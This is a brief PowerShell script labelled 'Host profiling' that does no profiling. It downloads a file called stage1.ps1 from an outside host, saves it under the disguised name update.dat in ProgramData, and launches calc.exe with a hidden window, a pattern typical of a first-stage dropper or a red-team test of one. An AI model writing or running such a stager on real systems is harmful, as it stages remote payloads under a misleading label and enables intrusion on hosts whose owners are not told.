
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://internal.corp/stage1.ps1",
    [string]$OutputPath = "C:\ProgramData\update.dat",
    [int]$StageTimeout = 57
)
Invoke-WebRequest -Uri $TransferUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
